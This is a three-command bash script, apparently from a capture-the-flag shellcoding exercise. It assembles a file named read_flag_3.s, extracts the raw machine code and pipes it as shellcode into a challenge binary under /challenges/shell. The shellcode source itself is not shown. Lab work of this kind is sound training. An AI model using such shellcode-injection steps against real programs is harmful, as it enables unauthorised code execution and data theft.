#!/bin/bash

gcc -static -nostdlib read_flag_3.s -o read_flag_3
objcopy --dump-section .text=out read_flag_3
cat out | /challenges/shell/level3_testing1